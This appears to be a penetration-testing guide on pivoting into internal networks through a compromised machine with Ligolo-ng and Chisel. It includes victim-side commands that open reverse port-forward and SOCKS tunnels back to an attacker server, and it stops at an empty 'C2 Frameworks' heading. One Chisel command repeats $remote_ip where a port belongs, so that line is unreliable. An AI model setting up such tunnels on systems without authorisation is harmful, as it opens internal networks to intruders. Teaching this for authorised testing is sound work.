---
label: Network Tunneling
subLabel: (Ligolo-ng, Chisel)
disabled: true
---

# Network Tunneling

It is often the case that after compromising one externally visible machine, we want to continue the attack on the internal network. Only the compromised machine has access to the internal network. So we need to somehow route outbound traffic from our system (e.g. Kali Linux) through the compromised machine. There are several ways and offensive tools to set up a TCP/UDP tunnel.

There are different methods of tunneling. The most popular are: TCP over TCP+TLS, TCP over HTTP, TCP over SSH. The idea is to pack standard TCP packets into some other protocol, usually a higher layer, and send them that way to the compromised machine. There is an tunnel client / agent running on a compromised machine so that it can unpack the tunneled packets to standard TCP and send them to the network interface. After this process, our TCP packets can find their way from the compromised machine to the internal network.

Example path:

```plaintext
(attacker)     TCP tunnel   (tunnel client)      TCP
  LINUX  -------------------> COMPROMISED ----------------> INTERNAL
 MACHINE       over HTTP        MACHINE                     NETWORK
```

## Ligolo-ng (TCP over TCP+TLS)

[Ligolo-ng](https://github.com/nicocha30/ligolo-ng) is a simple tool to establish tunnels using TUN interface on Linux. It's basically a custom virtual network interface that translates all packets and sends it to the remote agent. On the other side of the tunnel, the agent unpacks the packets. The tool uses TCP over TCP+TLS tunneling.

Since tunneling has been implemented at the network interface level, **the established tunnel is completely transparent from the attacker's point of view. It does not require any additional configuration of the offensive tooling used during the engagement**.

## Chisel (TCP over HTTP)

[Chisel](https://github.com/jpillora/chisel) is a tool to establish a TCP/UDP tunnel over HTTP. Allows you to do a simple port forwarding and establish a SOCKS tunnel.

### Simple port forwarding

Attacker:

```bash
# Run Chisel server listening on port
chisel server --reverse --port $srv_port
```

Victim:

```bash
# Bind a socket to attacker's port
chisel client $srv_ip:$srv_port R:$attacker_port:$remote_ip:$remote_ip
```

After that using `http://localhost:$attacker_port` an attacker (from its local machine) is accessing a socket defined on the client side of the tunnel.

### SOCKS tunnel

SOCKS tunnel mostly requires the use of `proxychains` tool. But at the same time it provides more flexibility because it allows access to any host and port without any additional configuration on the client side. Something for something...

Attacker:

```bash
# Run Chisel server listening on port
chisel server --reverse --port $srv_port
```

Victim:

```bash
chisel client $srv_ip:$srv_port R:$attacker_port:socks
```

In order to use the established tunnel packets must be translated to SOCKS. All tools that do not natively support the SOCKS protocol must be passed through a `proxychains` tool. The port used for the SOCKS tunnel must be set in the config file: `/etc/proxychains4.conf`. This is the `$attacker_port` from the snippet above.

```bash
# Example usage: all ffuf requests are transmitted via SOCKS tunnel
proxychains ffuf [...]
```

## C2 Frameworks

